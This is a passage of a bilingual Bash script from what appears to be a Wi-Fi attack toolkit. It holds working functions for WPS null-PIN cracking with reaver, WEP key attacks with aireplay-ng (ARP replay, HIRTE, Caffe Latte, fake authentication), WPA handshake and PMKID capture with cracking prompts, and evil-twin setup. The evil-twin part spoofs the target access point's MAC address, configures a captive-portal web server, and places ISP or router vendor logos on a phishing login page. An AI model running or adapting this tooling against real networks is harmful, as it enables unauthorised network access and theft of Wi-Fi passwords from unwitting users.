      success_ln "Se ha obtenido la contraseña WPA del punto de acceso: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
    fi
  else
    if [ "$lang" == "en" ]; then
      failed_ln "It was not possible to obtain the password"
    else
      failed_ln "No fue posible obtener la contraseña"
    fi
  fi

  create_informative_report
  log_completed
  
  ask_to_exit
}

# Null Pin attack (reaver)
function null_pin_attack(){
  clear_screen

  if [ "$lang" = "en" ]; then
    type_of_attack="Null PIN Attack"
    info_ln "This attack sends a null PIN to check if the access point receives it as a valid PIN so that the access point password can be obtained"
  else
    type_of_attack="Ataque de PIN nulo"
    info_ln "Este ataque envía un PIN nulo para comprobar si el punto de acceso lo recibe como un PIN válido, para poderr conseguir la contraseña del punto de acceso"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="1m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching Null PIN attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de PIN nulo, presiona Ctrl+C para pararlo"
  fi

  # Perform attack
  if [ "$channel" -le 14 ]; then
    reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -g 1 -d 2 -p '' -vv | tee "${cache_path}/reaver_output.txt" &
  else
    reaver -i "${monitor_interface}" -b "${ap_bssid}" -c "${channel}" -L -f -N -g 1 -d 2 -p '' -vv -5 | tee "${cache_path}/reaver_output.txt" &
  fi
  reaver_PID=$!

  sleep "${attack_time}"
  kill_processes ${reaver_PID}
  sleep 1

  # Check if the WPA PSK was retrieved
  if [ "$(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:")" ]; then
    if [ "$lang" == "en" ]; then
      success_ln "The WPA password of the access point was obtained: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
    else
      success_ln "Se ha obtenido la contraseña WPA del punto de acceso: $(cat "${cache_path}/reaver_output.txt" | grep "WPA PSK:" | awk '{print $NF}')"
    fi
  else
    if [ "$lang" == "en" ]; then
      failed_ln "It was not possible to obtain the password"
    else
      failed_ln "No fue posible obtener la contraseña"
    fi
  fi

  create_informative_report
  log_completed
  
  ask_to_exit
}


#
# WEP attacks
#

# ARP Replay attack (aireplay-ng)
function arp_replay_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="ARP Replay Attack"
    info_ln "This attack consists in sending tons of ARP packets to capture enough IVs to crack the WEP key"
  else
    type_of_attack="Ataque ARP Replay"
    info_ln "Este ataque consiste en enviar muchos paquetes ARP para asi capturar suficientes IVs como para poder crackear la clave WEP"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching Replay attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de Replay, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -3 -x 1024 -g 1000000 -b ${ap_bssid} -h ${current_mac} ${monitor_interface} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    aireplay-ng -3 -x 1024 -g 1000000 -b ${ap_bssid} -h ${current_mac} ${monitor_interface} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill_processes ${aireplay_PID}

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 1
    kill_processes ${airodump_PID}

    move_network_capture
    log_capture_files
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi

  ask_to_crack_ivs
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_ivs "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# HIRTE attack (aireplay-ng)
function hirte_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="HIRTE Attack"
    info_ln "This attack combines the fragmentation attack and the caffe latte attack to crack the WEP key"
  else
    type_of_attack="Ataque HIRTE"
    info_ln "Este ataque combina el ataque de fragmentacion y el ataque caffe latte para crackear la clave WEP"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching HIRTE attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque HIRTE, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -7 -F -D -b ${ap_bssid} -h "${current_mac}" ${monitor_interface} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    aireplay-ng -7 -F -D -b ${ap_bssid} -h "${current_mac}" ${monitor_interface} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill_processes ${aireplay_PID}

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 1
    kill_processes ${airodump_PID}

    move_network_capture
    log_capture_files
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi

  ask_to_crack_ivs
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_ivs "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# Caffe Latte attack (aireplay-ng)
function caffe_latte_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="Caffe Latte Attack"
    info_ln "This attack allows you to obtain the WEP key from a client system, this is done by capturing an ARP packet, manipulating it and then sending it back to the client"
  else
    type_of_attack="Ataque Caffe Latte"
    info_ln "Este ataque permite obtener la clave WEP del sistema de un cliente, esto se hace capturando un paquete ARP, manipulandolo y luego enviándolo de vuelta al cliente"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu
  
  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching Caffe Latte attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque Caffe Latte, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -6 -F -D -b ${ap_bssid} -h ${current_mac} ${monitor_interface} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    aireplay-ng -6 -F -D -b ${ap_bssid} -h ${current_mac} ${monitor_interface} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill_processes ${aireplay_PID}

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 1
    kill_processes ${airodump_PID}

    move_network_capture
    log_capture_files
  fi

  rm replay_arp-*.cap 2>/dev/null

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi

  ask_to_crack_ivs
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_ivs "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# Fake Authentication attack (aireplay-ng)
function fake_authentication_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="Fake Authentication Attack"
    info_ln "This attack creates fake devices to make the access point generate new IVs so that the WEP key can be cracked"
  else
    type_of_attack="Ataque de falsa autenticación"
    info_ln "Este ataque crea dispositivos falsos para hacer que el punto de acceso genere nuevos IVs para poder crackear la clave WEP"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu
  
  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching fake authentication attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque de autenticación falsa, presiona Ctrl+C para pararlo"
  fi

  echo
  if [ "$verbose" == "false" ]; then
    aireplay-ng -1 3 -o 1 -q 10 -a "${ap_bssid}" -h "${current_mac}" ${monitor_interface} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    aireplay-ng -1 3 -o 1 -q 10 -a "${ap_bssid}" -h "${current_mac}" ${monitor_interface} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill_processes ${aireplay_PID}

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 1
    kill_processes ${airodump_PID}

    move_network_capture
    log_capture_files
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi

  ask_to_crack_ivs
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_ivs "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}



#
# Handshake attacks
#

# Passive WPA Capture attack (airodump-ng)
function passive_capture_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="WPA handshake capture"
    info_ln "This attack tries to capture network packets constantly in order to catch, at some point, the handshake of a device connecting to the access point"
  else
    type_of_attack="Captura de handshake WPA"
    info_ln "Este ataque intenta capturar paquetes de red constantemente para capturar en algun momento el handshake de un dispositivo conectandose al punto de acceso"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  echo
  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching passive WPA handshake capture, press Ctrl+C to stop it"
  else
    status "Iniciando captura pasiva de handshake WPA, presiona Ctrl+C para pararlo"
  fi

  if [ "${airmon_check_kill}" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+$(( $(xdpyinfo | grep "dimensions" | awk '{print $2}' | awk ' {print $2}' FS="x") / 4 )) -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"${cache_path}/${cap_name}\" --bssid \"${ap_bssid}\" ${monitor_interface}" 2>/dev/null & # Escape double quotes to avoid errors
  else
    airodump-ng -c ${channel} -w "${cache_path}/${cap_name}" --bssid "${ap_bssid}" "${monitor_interface}" &
  fi
  passive_PID=$!

  # Sleep for the asked time
  sleep "${attack_time}"
  kill_processes ${passive_PID}

  echo
  if [ "$(check_wpa_handshake "${cache_path}/${cap_name}-01.cap")" == "true" ]; then
    move_network_capture
    log_capture_files
  fi

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi

  check_captured_handshakes

  c_h="true"
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake "${output_path}/${ap_dir}/${cap_name}.cap"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    ask_to_exit
  fi
}

# PMKID attack (hcxtools)
function pmkid_attack(){
  clear_screen

  if [ "$lang" == "en" ]; then
    type_of_attack="PMKID Attack"
    info_ln "This attack attempts to catch the PMKID handshake of an access point, then it can be cracked to obtain the password. This is a clientless attack"
  else
    type_of_attack="Ataque PMKID"
    info_ln "Este ataque intenta capturar el handshake PMKID de un punto de acceso el cual puede ser crackeado para obtener la contraseña. Este ataque no requiere clientes conectados"
  fi

  # Scan nearby APs
  scan_aps
  log_back_to_menu

  # Disable monitor mode as hcxtools may break if monitor mode was enabled with airmon-ng
  airmon-ng stop "${monitor_interface}" &>/dev/null
  pmkid_running="true"

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    status "Launching PMKID attack, press Ctrl+C to stop it"
  else
    status "Iniciando ataque PMKID, presiona Ctrl+C para pararlo"
  fi

  ctrl_c_pressed=""

  hcxdumptool -i "${managed_interface}" -c ${pmkid_channel} -w "${cache_path}/${cap_name}.pcapng" | grep -v "bye-bye" &
  hcx_PID=$!
  
  sleep "${attack_time}"
  kill_processes ${hcx_PID}

  sleep 1
  remove_file "${cache_path}/all_pmkid_handshakes.txt"

  if [ ! "${ctrl_c_pressed}" ]; then
    if [ "$lang" == "en" ]; then
      info_ln "Extracting hashes from ${cache_path}/${cap_name}.pcapng"
    else
      info_ln "Extrayendo hashes del archivo ${cache_path}/${cap_name}.pcapng"
    fi
    sleep 2 # Let the user read

    # Extract all the handshakes in hashcat crackeable format
    if [ "$verbose" == "false" ]; then
      hcxpcapngtool -o "${cache_path}/all_pmkid_handshakes.txt" "${cache_path}/${cap_name}.pcapng" &>/dev/null
    elif [ "$verbose" == "true" ]; then
      echo
      hcxpcapngtool -o "${cache_path}/all_pmkid_handshakes.txt" "${cache_path}/${cap_name}.pcapng"
    fi; sleep 2

    # Check if at least one handshake was captured by checking if the file exists
    if [ -f "${cache_path}/all_pmkid_handshakes.txt" ]; then
      if [ "$lang" == "en" ]; then
        info "Filtering captured PMKID handshakes..."
      else
        info "Filtrando los handshakes PMKID capturados..."
      fi

      create_dir

      # Filter the handshakes for the targeted access point
      if [ "$verbose" == "false" ]; then
        hcxhashtool -o "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt" --mac-ap=${ap_bssid} -i "${cache_path}/all_pmkid_handshakes.txt" &>/dev/null
      elif [ "$verbose" == "true" ]; then
        hcxhashtool -o "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt" --mac-ap=${ap_bssid} -i "${cache_path}/all_pmkid_handshakes.txt"
      fi; sleep 0.5

      # Check if there are more than one handshake to extract the rest of the PMKID handshakes
      if [ "$(wc -l "${cache_path}/all_pmkid_handshakes.txt" | awk '{print $1}')" -gt 1 ]; then
        # Get all the handshakes and remove the one from the targeted AP
        handshakes_content="$(cat "${cache_path}/all_pmkid_handshakes.txt" | grep -v "$(echo "${ap_bssid}" | tr -d ":")")"
        # Overwrite the handshakes file
        echo -e "${handshakes_content}" > "${cache_path}/all_pmkid_handshakes.txt"

        if [ "$lang" == "en" ]; then
          status "More PMKID handshakes from other access points were captured, the crackeable hashes will be saved under their respective directories:"
        else
          status "Se han capturado mas handshakes PMKID de otros puntos de acceso, los hashes en formato crackeable seran guardados en sus respectivas carpetas:"
        fi

        # Iterate over the handshakes (in hashcat format)
        while read -r line; do
          # Parse the BSSID of the AP from the hash
          hash_bssid="$(echo "${line}" | awk '{print $4}' FS="*" | tr '[:lower:]' '[:upper:]' | sed 's/\(..\)/&:/g; s/.$//' | tr -d "\n")"
          # Parse the matching ESSID from the APs scan
          #hash_essid="$(cat "${cache_path}/airodump-01.csv" | grep -i "${hash_bssid}" | rev | cut -d "," -f2 | rev | sed 's/^[[:blank:]]*//' | head - | tr -d "\n")"
          hash_essid="$(cat ${cache_path}/airodump-01.csv | awk '/Station MAC/{exit} 1' | sed '/^[[:space:]]*$/d' | sed 's/# beacons/Beacons/' | sed 's/channel/Channel/' | cut --complement -f 2,3,11,12,13,15 -d, | tail -n +2 | grep -i "${hash_bssid}" | rev | cut -d "," -f1 | rev | sed 's/^[[:blank:]]*//' | tr -d "\n")"

          # Create the folder for the other APs
          if [ "${hash_essid}" ] && [ "${hash_bssid}" ]; then
            new_ap_dir="${output_path}/${hash_essid}_${hash_bssid}"
          elif [ ! "${hash_essid}" ] && [ "${hash_bssid}" ]; then
            new_ap_dir="${output_path}/${hash_bssid}"
          fi

          check_and_create "${new_ap_dir}"

          # Extract and filter the hash for the current AP
          hcxhashtool -i "${cache_path}/all_pmkid_handshakes.txt" --mac-ap=${hash_bssid} -o "${new_ap_dir}/${cap_name}_pmkid_handshake.txt" &>/dev/null

          if [ "$lang" == "en" ]; then
            if [ "${hash_essid}" ]; then
              info "${hash_essid} handshake has been written to ${new_ap_dir}/${cap_name}_pmkid_handshake.txt"
            else
              info "${hash_bssid} handshake has been written to ${new_ap_dir}/${cap_name}_pmkid_handshake.txt"
            fi
          else
            if [ "${hash_essid}" ]; then
              info "El handshake de ${hash_essid} ha sido guardado en ${new_ap_dir}/${cap_name}_pmkid_handshake.txt"
            else
              info "El handshake de ${hash_bssid} ha sido guardado en ${new_ap_dir}/${cap_name}_pmkid_handshake.txt"
            fi
          fi
        done <<< "$(cat "${cache_path}/all_pmkid_handshakes.txt" | sort -u)"
      fi
    fi
  fi

  if [ "$lang" == "en" ]; then
    status_ln "Reconfiguring the network interface"
  else
    status_ln "Reconfigurando la interfaz de red"
  fi

  # Disable monitor mode manually with iw
  ip link set "${managed_interface}" down 2>/dev/null
  iw "${managed_interface}" set type managed 2>/dev/null
  ip link set "${managed_interface}" up 2>/dev/null

  # Re-enable monitor mode with airmon-ng
  airmon-ng start "${managed_interface}" &>/dev/null
  pmkid_running="false"

  create_informative_report
  log_completed
  if [ "${create_graph}" == "true" ]; then
    create_graph_file "${cache_path}/airodump-01.csv" "${graphs_path}/${cap_name}.png"
  fi

  if [ -f "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt" ]; then
    if [ "$lang" == "en" ]; then
      success_ln "The PMKID handshake has been written to ${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt"
      input_no_line "Do you want to crack the PMKID handshake? (yes/no): " crack_option
    else
      success_ln "El handshake PMKID ha sido almacenado en ${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt"
      input_no_line "¿Quieres crackear el handshake PMKID? (si/no): " crack_option
    fi

  else
    if [ "$lang" == "en" ]; then
      failed_ln "The PMKID handshake of the AP has not been captured"
    else
      failed_ln "No se ha capturado el handshake PMKID de este AP"
    fi
  fi
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_pmkid_handshake "${output_path}/${ap_dir}/${cap_name}_pmkid_handshake.txt"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    exit_wef
  else
    
    ask_to_exit
  fi
}




#
# Evil Twin attack functions
#

function setup_interface_evil_twin(){
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    if hash rfkill 2>/dev/null; then
      rfkill unblock all > /dev/null 2>&1
    fi

    ip link set "${evil_twin_interface}" down 2>/dev/null
    iw "${evil_twin_interface}" set monitor control 2>/dev/null
    # Check MAC spoofing
    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
      macchanger -m "${ap_bssid}" ${evil_twin_interface} &>/dev/null
    fi
    ip link set "${evil_twin_interface}" up 2>/dev/null

    rand_mac="$(hexdump -n 6 -ve '1/1 "%.2x "' /dev/random | awk -v a="2,6,a,e" -v r="$RANDOM" 'BEGIN{srand(r);}NR==1{split(a,b,",");r=int(rand()*4+1);printf "%s%s:%s:%s:%s:%s:%s\n",substr($1,0,1),b[r],$2,$3,$4,$5,$6}')"
    iw "${evil_twin_interface}" interface add "mon${evil_twin_interface}" type monitor addr ${rand_mac}; sleep 0.3

  else
    ip link set "${evil_twin_interface}" down 2>/dev/null
    iw "${evil_twin_interface}" set type monitor 2>/dev/null
    # Check MAC spoofing
    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
      macchanger -m "${ap_bssid}" ${evil_twin_interface} &>/dev/null
    fi
    ip link set "${evil_twin_interface}" up 2>/dev/null
  fi
}

function restore_interface_evil_twin(){
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    # Delete virtual interface
    iw "mon${evil_twin_interface}" del 2>/dev/null; sleep 0.2
  fi

  ip link set "${evil_twin_interface}" down 2>/dev/null; sleep 0.1
  iw "${evil_twin_interface}" set type managed 2>/dev/null; sleep 0.1
  ip link set "${evil_twin_interface}" up 2>/dev/null; sleep 0.2
}

function create_lighttpd_conf(){
  { 
  echo -e "server.document-root = \"${portal_to_use_path}\"\n"
	echo -e "server.modules = ("
	echo -e "  \"mod_auth\","
	echo -e "  \"mod_cgi\","
	echo -e "  \"mod_redirect\""
	echo -e ")\n"
	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
	echo -e "  url.redirect = ( \"^/index.htm$\" => \"/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "\$HTTP[\"host\"] =~ \"gstatic.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.google.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.apple.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "server.port = 80\n"
	echo -e "index-file.names = ( \"index.htm\", \"index.html\", \"index.php\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "  \".css\" => \"text/css\","
	echo -e "  \".js\" => \"text/javascript\","
  echo -e "  \".html\" => \"text/html\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} >> "${cache_path}/lighttpd.conf"
}

function add_vendor_logo_evil_twin(){
  if [ "${ap_bssid}" ] || [ "${essid}" ]; then
    target_vendor="$(get_vendor_by_mac "${ap_bssid}")"

    if [ "$(echo "${essid}" | grep -i "movistar")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/movistar.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${essid}" | grep -i "vodafone")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/vodafone.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${essid}" | grep -i "tp-link")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/tp-link.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${essid}" | grep "DIGI")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/digi.png\" height=50% width=50%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "askey")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/askey.png\" height=60% width=60%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "xiaomi")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/xiaomi.png\" height=15% width=15%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "mitrastar")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/mitrastar.png\" height=60% width=60%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "movistar")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/movistar.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "tp-link")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/tp-link.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "sagemcom")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/sagemcom.png\" height=60% width=60%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "sercomm")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/sercomm.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "huawei")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/huawei.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "zte")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/zte.png\" height=30% width=30%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "arcadyan")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/arcadyan.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "arris")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/arris.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "cisco")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/cisco.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "linksys")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/linksys.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "orange")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/orange.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "dell")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/dell.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "juniper")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/juniper.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "avaya")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/avaya.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "hewlett")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/hewlett.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "nokia")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/nokia.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "zyxel")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/zyxel.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "dwnet")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/dwnet.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "sernet")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/sernet.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "comtrend")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/comtrend.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "netis")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/netis.png\" height=35% width=35%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "netgear")" ]; then
      sed -i "14s|.*|echo -e '                  <center><img src=\"logos/netgear.png\" height=40% width=40%></center>'|" "${portals_path}/${country_code}-portal/index.htm"
    elif [ "$(echo "${target_vendor}" | grep -i "vodafone")" ]; then
